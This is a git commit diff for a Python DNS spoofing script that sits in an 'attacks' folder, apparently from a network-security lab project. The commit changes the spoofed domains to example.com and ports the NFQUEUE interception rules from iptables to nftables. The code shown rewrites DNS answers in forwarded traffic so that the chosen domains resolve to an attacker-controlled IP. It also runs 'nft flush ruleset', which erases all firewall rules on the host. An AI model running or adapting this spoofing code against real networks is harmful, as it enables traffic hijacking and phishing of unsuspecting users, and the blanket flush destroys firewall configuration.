f3bedf4c0c2cfc4223706a9eb1ed060cfeb330ec
bayoub03 <ayoubbouh03@gmail.com>
2023-05-02 23:48:21 +0200

    adapting the code for nftables

--- attacks/dns_arp_cache_poisoning/main_DNS_poisoning.py
+++ attacks/dns_arp_cache_poisoning/main_DNS_poisoning.py
@@ -17,15 +17,15 @@ def display_banner():
     """)
 
 dns_hosts = {
-    b"google.com.": "10.12.0.10", # redirect google to the internal http server
-    b"www.google.com.": "10.12.0.10",
+    b"example.com.": "10.12.0.10", # redirect google to the internal http server
+    b"www.example.com.": "10.12.0.10",
 }
 
 def modify_packet(packet):
     """
     Modifies the DNS Resource Record `packet` ( the answer part)
     to map our globally defined `dns_hosts` dictionary.
-    For instance, whenever we see a google.com answer, this function replaces 
+    For instance, whenever we see a example.com answer, this function replaces 
     the real IP address with fake IP address (10.12.0.10)
     """
     # get the DNS question name, the domain name
@@ -37,7 +37,6 @@ def modify_packet(packet):
         return packet
     # craft new answer, overriding the original
     # setting the rdata for the IP we want to redirect (spoofed)
-    # for instance, google.com will be mapped to "192.168.1.100"
     packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
     # set the answer count to 1
     packet[DNS].ancount = 1
@@ -76,20 +75,20 @@ display_banner()
 
 QUEUE_NUM = 0
 
-# insert the iptables FORWARD rule
+# Add a ruleset for the netfilterqueue using nftables
 print("[+] Adding ruleset for netfilterqueue...")
-os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+os.system(f"nft add table inet filter")
+os.system(f"nft add chain inet filter forward {{ type filter hook forward priority 0 \; }}")
+os.system(f"nft add rule inet filter forward queue num {QUEUE_NUM}")
 
-# instantiate the netfilter queue
+# Instantiate the netfilter queue
 queue = NetfilterQueue()
 
 try:
-    # bind the queue number to our callback `process_packet`
-    # and start it
+    # Bind the queue number to our callback `process_packet` and start it
     queue.bind(QUEUE_NUM, process_packet)
     queue.run()
 except KeyboardInterrupt:
-    # if want to exit, make sure we
-    # remove that rule we just inserted, going back to normal.
+    # If you want to exit, make sure you remove the ruleset you just inserted, going back to normal.
     print("[+] Flushing rulesets...")
-    os.system("iptables --flush")
+    os.system("nft flush ruleset")
